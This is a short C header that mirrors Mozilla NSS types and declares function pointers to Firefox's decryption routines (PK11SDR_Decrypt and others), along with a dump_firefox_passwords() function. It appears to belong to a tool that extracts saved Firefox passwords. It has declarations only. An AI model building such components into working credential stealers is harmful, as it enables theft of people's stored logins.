#ifndef __FIREFOX__
#define __FIREFOX__

#define NOMINMAX
#define PRBool   int
#define PRUint32 unsigned int
#define PR_TRUE  1
#define PR_FALSE 0


typedef struct PK11SlotInfoStr PK11SlotInfo;


typedef enum _SECItemType
{
	siBuffer = 0,
	siClearDataBuffer = 1,
	siCipherDataBuffer = 2,
	siDERCertBuffer = 3,
	siEncodedCertBuffer = 4,
	siDERNameBuffer = 5,
	siEncodedNameBuffer = 6,
	siAsciiNameString = 7,
	siAsciiString = 8,
	siDEROID = 9,
	siUnsignedInteger = 10,
	siUTCTime = 11,
	siGeneralizedTime = 12
}SECItemType;

typedef struct _SECItem
{
	SECItemType type;
	unsigned char *data;
	unsigned int len;
}SECItem;

typedef enum _SECStatus {
	SECWouldBlock = -2,
	SECFailure = -1,
	SECSuccess = 0
}SECStatus;

typedef DWORD(__cdecl *NSS_Init_p)(LPSTR strProfilePath);
typedef DWORD(__cdecl *NSS_Shutdown_p)();
typedef DWORD(__cdecl *PL_ArenaFinish_p)();
typedef DWORD(__cdecl *PR_Cleanup_p)();
typedef PK11SlotInfo *(__cdecl *PK11_GetInternalKeySlot_p)();
typedef DWORD(__cdecl *PK11_FreeSlot_p)(PK11SlotInfo*);
typedef DWORD(__cdecl *PK11SDR_Decrypt_p)(SECItem *pData, SECItem *pResult, LPVOID cx);

VOID dump_firefox_passwords();

#endif